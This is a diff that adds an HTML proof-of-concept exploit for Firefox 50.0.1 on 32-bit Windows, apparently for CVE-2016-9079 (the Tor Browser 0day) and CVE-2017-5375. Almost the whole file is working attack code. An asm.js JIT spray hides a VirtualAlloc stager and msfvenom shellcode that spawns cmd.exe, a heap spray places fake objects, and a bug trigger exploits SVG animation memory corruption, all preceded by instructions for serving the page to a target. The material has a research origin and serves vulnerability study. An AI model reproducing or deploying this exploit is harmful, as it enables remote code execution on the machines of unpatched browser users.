@@ -1,0 +1,375 @@
+<!DOCTYPE HTML>
+
+<!--
+
+    FULL ASLR AND DEP BYPASS USING ASM.JS JIT SPRAY (CVE-2017-5375)
+    PoC Exploit against Firefox 50.0.1 (CVE-2016-9079 - Tor Browser 0day)
+
+    Tested on:
+
+    Release 50.0.1 32-bit - Windows 8.1 / Windows 10
+    https://ftp.mozilla.org/pub/firefox/releases/50.0.1/win32/en-US/Firefox%20Setup%2050.0.1.exe
+
+    Howto:
+
+    1) serve PoC over network and open it in Firefox 50.0.1 32-bit
+    2) if you don't see cmd.exe, open processexplorer and verify that cmd.exe was spawned by firefox.exe
+
+    A successfull exploit attempt should pop cmd.exe
+
+    Writeup: https://rh0dev.github.io/blog/2017/the-return-of-the-jit/
+    
+    (C) Rh0
+
+    Jul. 13, 2017
+
+-->
+
+<script async>
+function asm_js_module(){
+    "use asm";
+    /* huge jitted nop sled */
+    function payload_code(){
+        var val = 0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        val = (val + 0xa8909090)|0;
+        /* 3 byte VirtualAlloc RWX stager */
+        val = (val + 0xa890db31)|0;
+        val = (val + 0xa89030b3)|0;
+        val = (val + 0xa81b8b64)|0;
+        val = (val + 0xa80c5b8b)|0;
+        val = (val + 0xa81c5b8b)|0;
+        val = (val + 0xa8b9006a)|0;
+        val = (val + 0xa8904c4c)|0;
+        val = (val + 0xa8902eb1)|0;
+        val = (val + 0xa85144b5)|0;
+        val = (val + 0xa8b99090)|0;
+        val = (val + 0xa8903233)|0;
+        val = (val + 0xa89045b1)|0;
+        val = (val + 0xa8514cb5)|0;
+        val = (val + 0xa8b99090)|0;
+        val = (val + 0xa8904e52)|0;
+        val = (val + 0xa8904bb1)|0;
+        val = (val + 0xa85145b5)|0;
+        val = (val + 0xa8590e6a)|0;
+        val = (val + 0xa84fe789)|0;
+        val = (val + 0xa8086b8b)|0;
+        val = (val + 0xa820738b)|0;
+        val = (val + 0xa8471b8b)|0;
+        val = (val + 0xa82ae349)|0;
+        val = (val + 0xa890c031)|0;
+        val = (val + 0xa890ad66)|0;
+        val = (val + 0xa89c613c)|0;
+        val = (val + 0xa8077c9d)|0;
+        val = (val + 0xa890202c)|0;
+        val = (val + 0xa89c073a)|0;
+        val = (val + 0xa8d7749d)|0;
+        val = (val + 0xa890bdeb)|0;
+        val = (val + 0xa8b9006a)|0;
+        val = (val + 0xa890636f)|0;
+        val = (val + 0xa8906cb1)|0;
+        val = (val + 0xa8516cb5)|0;
+        val = (val + 0xa8b99090)|0;
+        val = (val + 0xa890416c)|0;
+        val = (val + 0xa89075b1)|0;
+        val = (val + 0xa85161b5)|0;
+        val = (val + 0xa8b99090)|0;
+        val = (val + 0xa8907472)|0;
+        val = (val + 0xa89056b1)|0;
+        val = (val + 0xa85169b5)|0;
+        val = (val + 0xa890eb89)|0;
+        val = (val + 0xa83cc583)|0;
+        val = (val + 0xa8006d8b)|0;
+        val = (val + 0xa890dd01)|0;
+        val = (val + 0xa878c583)|0;
+        val = (val + 0xa8006d8b)|0;
+        val = (val + 0xa890dd01)|0;
+        val = (val + 0xa820458b)|0;
+        val = (val + 0xa890d801)|0;
+        val = (val + 0xa890d231)|0;
+        val = (val + 0xa890e789)|0;
+        val = (val + 0xa8590d6a)|0;
+        val = (val + 0xa810348b)|0;
+        val = (val + 0xa890de01)|0;
+        val = (val + 0xa890a6f3)|0;
+        val = (val + 0xa8900de3)|0;
+        val = (val + 0xa804c283)|0;
+        val = (val + 0xa890dbeb)|0;
+        val = (val + 0xa8247d8b)|0;
+        val = (val + 0xa890df01)|0;
+        val = (val + 0xa890ead1)|0;
+        val = (val + 0xa890d701)|0;
+        val = (val + 0xa890d231)|0;
+        val = (val + 0xa8178b66)|0;
+        val = (val + 0xa81c7d8b)|0;
+        val = (val + 0xa890df01)|0;
+        val = (val + 0xa802e2c1)|0;
+        val = (val + 0xa890d701)|0;
+        val = (val + 0xa8903f8b)|0;
+        val = (val + 0xa890df01)|0;
+        val = (val + 0xa890406a)|0;
+        val = (val + 0xa890c031)|0;
+        val = (val + 0xa85030b4)|0;
+        val = (val + 0xa85010b4)|0;
+        val = (val + 0xa890006a)|0;
+        val = (val + 0xa890d7ff)|0;
+        val = (val + 0xa890c931)|0;
+        val = (val + 0xa89000b5)|0;
+        val = (val + 0xa890c3b1)|0;
+        val = (val + 0xa890ebd9)|0;
+        val = (val + 0xa82434d9)|0;
+        val = (val + 0xa890e689)|0;
+        val = (val + 0xa80cc683)|0;
+        val = (val + 0xa890368b)|0;
+        val = (val + 0xa85fc683)|0;
+        val = (val + 0xa890c789)|0;
+        val = (val + 0xa81e8b66)|0;
+        val = (val + 0xa81f8966)|0;
+        val = (val + 0xa802c683)|0;
+        val = (val + 0xa802c783)|0;
+        val = (val + 0xa8901e8a)|0;
+        val = (val + 0xa8901f88)|0;
+        val = (val + 0xa803c683)|0;
+        val = (val + 0xa801c783)|0;
+        val = (val + 0xa803e983)|0;
+        val = (val + 0xa89008e3)|0;
+        val = (val + 0xa890cceb)|0;
+        val = (val + 0xa890e0ff)|0;
+        val = (val + 0xa824248d)|0;
+        /* $ msfvenom --payload windows/exec CMD=cmd.exe EXITFUNC=seh */
+        val = (val + 0xa882e8fc)|0;
+        val = (val + 0xa8000000)|0;
+        val = (val + 0xa8e58960)|0;
+        val = (val + 0xa864c031)|0;
+        val = (val + 0xa830508b)|0;
+        val = (val + 0xa80c528b)|0;
+        val = (val + 0xa814528b)|0;
+        val = (val + 0xa828728b)|0;
+        val = (val + 0xa84ab70f)|0;
+        val = (val + 0xa8ff3126)|0;
+        val = (val + 0xa8613cac)|0;
+        val = (val + 0xa82c027c)|0;
+        val = (val + 0xa8cfc120)|0;
+        val = (val + 0xa8c7010d)|0;
+        val = (val + 0xa852f2e2)|0;
+        val = (val + 0xa8528b57)|0;
+        val = (val + 0xa84a8b10)|0;
+        val = (val + 0xa84c8b3c)|0;
+        val = (val + 0xa8e37811)|0;
+        val = (val + 0xa8d10148)|0;
+        val = (val + 0xa8598b51)|0;
+        val = (val + 0xa8d30120)|0;
+        val = (val + 0xa818498b)|0;
+        val = (val + 0xa8493ae3)|0;
+        val = (val + 0xa88b348b)|0;
+        val = (val + 0xa831d601)|0;
+        val = (val + 0xa8c1acff)|0;
+        val = (val + 0xa8010dcf)|0;
+        val = (val + 0xa8e038c7)|0;
+        val = (val + 0xa803f675)|0;
+        val = (val + 0xa83bf87d)|0;
+        val = (val + 0xa875247d)|0;
+        val = (val + 0xa88b58e4)|0;
+        val = (val + 0xa8012458)|0;
+        val = (val + 0xa88b66d3)|0;
+        val = (val + 0xa88b4b0c)|0;
+        val = (val + 0xa8011c58)|0;
+        val = (val + 0xa8048bd3)|0;
+        val = (val + 0xa8d0018b)|0;
+        val = (val + 0xa8244489)|0;
+        val = (val + 0xa85b5b24)|0;
+        val = (val + 0xa85a5961)|0;
+        val = (val + 0xa8e0ff51)|0;
+        val = (val + 0xa85a5f5f)|0;
+        val = (val + 0xa8eb128b)|0;
+        val = (val + 0xa86a5d8d)|0;
+        val = (val + 0xa8858d01)|0;
+        val = (val + 0xa80000b2)|0;
+        val = (val + 0xa8685000)|0;
+        val = (val + 0xa86f8b31)|0;
+        val = (val + 0xa8d5ff87)|0;
+        val = (val + 0xa80efebb)|0;
+        val = (val + 0xa868ea32)|0;
+        val = (val + 0xa8bd95a6)|0;
+        val = (val + 0xa8d5ff9d)|0;
+        val = (val + 0xa87c063c)|0;
+        val = (val + 0xa8fb800a)|0;
+        val = (val + 0xa80575e0)|0;
+        val = (val + 0xa81347bb)|0;
+        val = (val + 0xa86a6f72)|0;
+        val = (val + 0xa8ff5300)|0;
+        val = (val + 0xa86d63d5)|0;
+        val = (val + 0xa8652e64)|0;
+        val = (val + 0xa8006578)|0;
+        val = (val + 0xa8909090)|0;
+
+        return val|0;
+    }
+    return payload_code 
+}
+</script>
+
+<script>
+function spray_asm_js_modules(){
+    sprayed = []
+    for (var i=0; i<= 0x1800; i++){
+        sprayed[i] = asm_js_module()
+    }
+}
+
+/* heap spray inspired by skylined */
+function heap_spray_fake_objects(){
+    var heap = []
+    var current_address = 0x08000000
+    var block_size = 0x1000000
+    while(current_address < object_target_address){
+        var heap_block = new Uint32Array(block_size/4 - 0x100)
+        for (var offset = 0; offset < block_size; offset += 0x100000){
+
+            /* fake object target = ecx + 0x88 and fake vtable*/
+            heap_block[offset/4 + 0x00/4] = object_target_address
+            /* self + 4 */
+            heap_block[offset/4 + 0x14/4] = object_target_address
+            /* the path to EIP */
+            heap_block[offset/4 + 0x18/4] = 4
+            heap_block[offset/4 + 0xac/4] = 1
+            /* fake virtual function --> JIT target */
+            heap_block[offset/4 + 0x138/4] = jit_payload_target 
+        }
+        heap.push(heap_block)
+        current_address += block_size
+    }
+    return heap
+}
+
+/* address of fake object */
+object_target_address = 0x30300000
+
+/* address of our jitted shellcode */
+jit_payload_target = 0x1c1c0054
+
+/* ASM.JS JIT Spray */
+spray_asm_js_modules()
+
+/* Spray fake objects */
+heap = heap_spray_fake_objects()
+
+/* -----> */
+/* bug trigger ripped from bugzilla report */
+var worker = new Worker('data:javascript,self.onmessage=function(msg){postMessage("one");postMessage("two");};');
+worker.postMessage("zero");
+var svgns = 'http://www.w3.org/2000/svg';
+var heap80 = new Array(0x1000);
+var heap100 = new Array(0x4000);
+var block80 = new ArrayBuffer(0x80);
+var block100 = new ArrayBuffer(0x100);
+var sprayBase = undefined;
+var arrBase = undefined;
+var animateX = undefined;
+var containerA = undefined;
+var offset = 0x88 // Firefox 50.0.1
+
+var exploit = function(){
+    var u32 = new Uint32Array(block80)
+
+    u32[0x4] = arrBase - offset;
+    u32[0xa] = arrBase - offset;
+    u32[0x10] = arrBase - offset;
+
+    for(i = heap100.length/2; i < heap100.length; i++)
+    {
+      heap100[i] = block100.slice(0)
+    }
+
+    for(i = 0; i < heap80.length/2; i++)
+    {
+      heap80[i] = block80.slice(0)
+    }
+
+    animateX.setAttribute('begin', '59s')
+    animateX.setAttribute('begin', '58s')
+
+    for(i = heap80.length/2; i < heap80.length; i++)
+    {
+      heap80[i] = block80.slice(0)
+    }
+
+    for(i = heap100.length/2; i < heap100.length; i++)
+    {
+      heap100[i] = block100.slice(0)
+    }
+
+    animateX.setAttribute('begin', '10s')
+    animateX.setAttribute('begin', '9s')
+    containerA.pauseAnimations();
+}
+
+worker.onmessage = function(e) {arrBase=object_target_address; exploit()}
+//worker.onmessage = function(e) {arrBase=0x30300000; exploit()}
+
+var trigger = function(){
+    containerA = document.createElementNS(svgns, 'svg')
+    var containerB = document.createElementNS(svgns, 'svg');
+    animateX = document.createElementNS(svgns, 'animate')
+    var animateA = document.createElementNS(svgns, 'animate')
+    var animateB = document.createElementNS(svgns, 'animate')
+    var animateC = document.createElementNS(svgns, 'animate')
+    var idA = "ia";
+    var idC = "ic";
+    animateA.setAttribute('id', idA);
+    animateA.setAttribute('end', '50s');
+    animateB.setAttribute('begin', '60s');
+    animateB.setAttribute('end', idC + '.end');
+    animateC.setAttribute('id', idC);
+    animateC.setAttribute('end', idA + '.end');
+    containerA.appendChild(animateX)
+    containerA.appendChild(animateA)
+    containerA.appendChild(animateB)
+    containerB.appendChild(animateC)
+    document.body.appendChild(containerA);
+    document.body.appendChild(containerB);
+}
+
+window.onload = trigger;
+setInterval("window.location.reload()", 3000)
+/* <----- */
+
+</script>
